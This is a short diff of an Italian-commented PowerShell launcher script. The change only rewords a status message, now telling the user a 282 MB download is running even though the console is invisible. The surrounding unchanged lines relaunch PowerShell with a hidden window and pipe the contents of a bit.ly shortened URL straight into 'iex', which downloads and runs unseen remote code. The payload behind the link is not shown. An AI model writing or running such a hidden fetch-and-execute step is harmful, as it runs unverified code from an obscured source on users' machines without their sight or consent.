@@ -1,6 +1,6 @@
 # Verifica se PowerShell è stato avviato con -WindowStyle Hidden
 if ($env:__PSLockdownPolicy -ne "4") {
-    Write-Output "Mi riavvio con -WindowStyle Hidden..."
+    Write-Output "Scarico il file, anche se non vedi la console sto scaricando, attendi (sono 282mb)"
     # Riavvia PowerShell con -WindowStyle Hidden e esegui il comando per scaricare e eseguire lo script
     Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -Command 'irm -uri ''https://bit.ly/winhubx'' | iex'"
     break  # Termina lo script corrente
